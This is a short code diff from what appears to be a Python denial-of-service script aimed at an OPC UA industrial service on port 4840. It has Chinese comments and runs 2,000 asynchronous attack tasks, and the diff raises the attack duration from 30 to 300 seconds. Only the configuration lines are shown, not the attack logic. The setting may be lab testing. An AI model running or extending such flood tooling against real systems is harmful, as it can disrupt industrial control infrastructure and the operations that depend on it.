@@ -58,7 +58,7 @@ def main():
     target_port = 4840
     source_ip = "10.5.0.94"  # 本机IP
     thread_count = 2000  # 异步任务数量
-    attack_time = 30  # 攻击持续时间（秒）
+    attack_time = 300  # 攻击持续时间（秒）
 
     # 运行异步攻击管理器
     asyncio.run(attack_manager(target_ip, target_port, source_ip, thread_count, attack_time))
